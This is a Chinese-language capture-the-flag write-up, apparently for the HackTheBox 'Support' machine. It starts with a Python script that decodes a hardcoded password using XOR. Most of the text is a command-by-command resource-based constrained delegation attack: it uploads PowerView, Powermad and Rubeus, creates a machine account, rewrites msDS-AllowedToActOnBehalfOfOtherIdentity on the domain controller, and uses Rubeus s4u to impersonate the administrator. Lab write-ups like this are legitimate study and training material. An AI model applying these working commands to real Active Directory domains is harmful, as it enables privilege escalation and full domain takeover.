编写一个python解密脚本

```
import base64

def decrypt_password(enc_password, key):
    array = base64.b64decode(enc_password)
    array2 = bytearray(array)
    for i in range(len(array)):
        array2[i] = array[i] ^ key[i % len(key)] ^ 223
    return array2.decode('ascii')

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

password = decrypt_password(enc_password, key)
print(password)
```

support属于shared support accounts组，这个组对DC.SUPPORT.HTB具有genericall的权限，

https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html，根据网页的内容，我们是针对一台computer具有genericall的权限，我们按步骤进行执行

步骤一：优先上传powerview和powermad等工具

```
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
cp /home/zkpc/Tools/Powermad/Powermad.ps1 .
cp /home/zkpc/Tools/Ghostpack-CompiledBinaries/Rubeus.exe .
upload PowerView.ps1
upload Powermad.ps1
upload Rubeus.exe
Import-Module .\PowerView.ps1
Import-Module .\Powermad.ps1
```

步骤二：添加滥用账户

```
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
```

![image-20241031165209267](https://files.seeusercontent.com/2026/04/07/uz9Y/image-20241031165209267.png)

步骤三：PowerView 可用于检索新创建的计算机帐户的安全标识符 （SID）

```
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
```

步骤四：构建一个通用 ACE

```
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

步骤五：在要接管的计算机帐户的 msDS-AllowedToActOnBehalfOfOtherIdentity 字段中设置此新创建的安全描述符

```
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

步骤六：使用rebuse将明文密码转化为RC4

```
.\Rubeus.exe hash /password:Summer2018!
```

```
.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/DC.support.htb /ptt
```
